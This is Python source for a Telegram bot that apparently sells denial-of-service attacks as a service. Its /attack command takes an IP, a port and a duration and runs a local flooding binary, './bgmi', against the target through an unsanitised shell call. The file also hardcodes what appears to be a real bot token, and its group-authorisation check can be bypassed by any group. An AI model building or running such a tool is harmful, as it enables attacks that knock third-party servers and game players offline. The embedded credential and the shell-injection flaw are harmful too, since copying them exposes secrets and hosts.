import os
import asyncio
from telegram import Update, Chat
from telegram.ext import Application, CommandHandler, CallbackContext

# Replace with your bot token
TELEGRAM_BOT_TOKEN = '7918812381:AAFaar5qOBbW5W9MAIwTtJKcwFopPo1z9k'

# Predefined list of authorized group IDs (replace these with actual group IDs)
AUTHORIZED_GROUPS = {-1002234966753, -1002234966753}  # Add your group IDs here

# Global variable to track running attacks
is_attack_running = False

# Check if the group is authorized
def is_group_authorized(chat_id):
    return chat_id in AUTHORIZED_GROUPS

# Command: Authorize Group (optional)
async def authorize_group(update: Update, context: CallbackContext):
    chat = update.effective_chat
    if chat.type in [Chat.GROUP, Chat.SUPERGROUP]:
        group_id = chat.id
        AUTHORIZED_GROUPS.add(group_id)
        await context.bot.send_message(chat_id=group_id, text="🍌")
    else:
        await update.message.reply_text("🍌")

# Command: Start
async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    if not is_group_authorized(chat_id):
        await context.bot.send_message(chat_id=chat_id, text="🍌")
        return

    message = (
        "*🔥 Welcome to the battlefield! 🔥*\n\n"
        "*Use /attack <ip> <port> <duration>*\n"
        "*Let the war begin! ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

# Command: Run Attack
async def run_attack(chat_id, ip, port, duration, context):
    global is_attack_running
    try:
        process = await asyncio.create_subprocess_shell(
            f"./bgmi {ip} {port} {duration}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    else:
        is_attack_running = False  # Mark attack as completed
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')

# Command: Attack
async def attack(update: Update, context: CallbackContext):
    global is_attack_running
    chat_id = update.effective_chat.id
    if not is_group_authorized(chat_id):
        await context.bot.send_message(chat_id=chat_id, text="🍌")
        return

    if is_attack_running:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ *Already running an attack, please wait.*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args

    try:
        duration = int(duration)
        if duration > 180:
            await context.bot.send_message(chat_id=chat_id, text="⚠️ *Maximum duration is 180, please choose a shorter duration.*", parse_mode='Markdown')
            return
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ *Invalid duration. Please enter a number.*", parse_mode='Markdown')
        return

    is_attack_running = True  # Mark attack as running
    await context.bot.send_message(chat_id=chat_id, text=(
        f"*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Let the battlefield ignite! 💥*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

# Main Function
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Command Handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("authorize_group", authorize_group))  # Optional

    application.run_polling()

if __name__ == '__main__':
    main()
